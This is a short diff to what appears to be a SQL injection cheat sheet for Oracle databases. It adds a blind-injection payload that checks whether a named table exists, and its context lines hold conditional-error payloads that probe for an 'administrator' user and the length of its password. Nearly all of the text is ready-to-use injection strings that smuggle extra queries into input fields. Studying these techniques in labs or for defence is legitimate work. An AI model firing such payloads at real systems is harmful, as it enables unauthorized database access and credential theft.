@@ -64,6 +64,12 @@
 
 ' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
 
+
+
+#Blind SQL injection with conditional errors to determine a table, other info exist or not
+
+' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.
+
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.
 
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.
